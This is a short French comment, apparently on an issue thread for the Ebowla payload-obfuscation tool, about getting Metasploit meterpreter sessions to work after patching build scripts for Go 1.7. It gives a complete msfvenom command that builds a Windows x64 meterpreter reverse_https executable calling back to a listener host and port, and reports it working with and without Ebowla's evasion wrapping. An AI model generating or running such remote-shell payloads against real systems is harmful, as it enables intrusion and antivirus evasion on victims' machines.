J'ai retouché les scripts build*.sh pour executer en go1.7 pour que ça marche. 
Les meterpreter bug mais d'apres mes observations ça vient du handler qui doit etre relancé a chaque nouvelle execution du payload et ne pas utiliser msfconsole -x qui semble merder aussi...

Apparemment ça viendrait plutot de la façon dont on genere meterpreter avec msfvenom, il faut utiliser : 

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=31337 -f raw -f exe > ~/Desktop/test8_https.exe
```

Utiliser 8/8fois sans erreur en brut sans ebowla et 3/3 fois avec ebowla
